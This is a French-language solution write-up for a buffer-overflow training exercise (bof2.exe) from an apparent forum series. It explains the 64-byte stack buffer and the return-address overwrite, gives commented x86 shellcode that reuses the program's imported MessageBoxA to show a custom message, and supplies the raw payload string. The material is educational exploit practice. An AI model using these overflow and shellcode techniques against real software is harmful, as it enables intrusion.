@@ -1,0 +1,70 @@
+*** Travail à faire pour le bof2.exe - Intitulé de oko ***
+
+"Bienvenue dans le deuxième topic spécial Buffer OverFlows
+
+Bon cette fois on va voir qu'il est possible de détourner une fonction importée par le programme cible...
+
+Pour le premier programme http://elooo.fff.free.fr/consult/bof2-oko_solution-elooo/bof2.exe (qui est fait le même que le premier avec un 
+plus gros buffer) il vous faudra écrire un shellcode affichant une messagebox avec un titre et un message 
+personnalisé ! (le buffer n'est pas très gros mais mettez juste deux trois caractères pour le principe)
+Pour jumper sur le shellcode, voyez la méthode à le_traître dans le post précédent.
+Ca devrait pas être trop dur "
+
+
+*** Solution pour le bof2.exe ***
+
+Je vais pas m'éterniser sur l'explication car le_traitre a déjà très bien fait ça pour le bof1.exe
+et il s'avère qu'ici au niveau du code, c'est exactement la même chose, excepté que le buffer est 
+plus grand, et qu'on ne nous demande pas exactement la même chose. :p
+
+En effet, si l'on regarde la stack dans IDA, on voit que cette fois, nous avons un buffer de 40h, 
+soit 64 en décimal, et aucun autre paramètre pushé avant la valeur de retour.
+Ce qui signifie que si on rentre plus de 64 caractères, pof, on crashe tout, et si l'on rentre 64 
+caractères quelconques + une adresse, l'adresse de retour se trouvant juste après les 64 bytes, 
+on va sauter sur la fameuse adresse entrée.
+
+Le but ici n'est pas de sauter où l'on veut dans le prog mais de faire afficher une messagebox 
+personnalisée en utilisant les fonctions déjà importées par le prog.
+
+Je vous poste en dessous mon shellcode commenté :
+
+=================================================================
+
+[BITS 32]
+
+mov eax, [esp+0x40] 		; on recupere l'adresse de retour
+xor ax, 0x4157 			; on xor pour recuperer l'offset du buffer du ":)"
+xor dword [eax], 0x014F657F 	; on xor pour changer le contenu du buffer ":)" avec "ELO"
+sub byte [eax+3], 0x01 		; j'ai du foutre un 1 a la fin dans le buffer pour eviter 
+				; le 0 dans le code, donc la je le soustrais pour avoir 
+				; une fin de string
+xor al, 0x34 			; je xor de nouveau pour recuperer l'offset du buffer de Bravo !!
+xor dword [eax], 0x76071D20 	; je xor pour en changer le contenu et mettre "bof"
+xor ax, 0x490 			; je xor pour avoir la bonne valeur d'argument pour la fonction 
+				; (celle qui va nous faire jumper vers le call MessageBoxA
+push eax 			; je le push sur la pile pour le passer a la fonction
+xor ax, 0x44A6 			; je xor pour recuperer l'adresse du call qui jump vers la fonction
+jmp eax 			; je jump sur cette fonction
+
+TIMES 0x40-($-$$) db 0x6F 	; dit au compilo de remplir le reste avec des 'o' car l'o j'aime ca ;)
+
+dd 0x401137 			; l'adresse de retour
+
+=================================================================
+
+
+Et en image ça donne :
+http://elooo.fff.free.fr/consult/bof2-oko_solution-elooo/bof.PNG
+
+Pour tester par vous même, pastez cette string dans le buffer et validez :
+‹D$@f5WA0eO€h440 vf5Pf5¦Dÿàooooooooooooooooooooooooooo7@
+
+En gros j'ai juste changé le contenu des deux buffers, puis je fais ensuite s'afficher la 
+messagebox en passant la "bonne" valeur à la fameuse fonction (si bonne valeur, normalement 
+la messagebox qui a pour titre ":)" et pour message "Bravo!!" s'affiche, et comme j'ai changé 
+le contenu des 2 buffers, et bien cette messagebox s'affiche toujours mais avec le titre et le 
+message que je voulais et puis ensuite, si je clique sur OK pour fermer la messagebox, ça ne 
+crashe plus :)
+
+------
+elooo
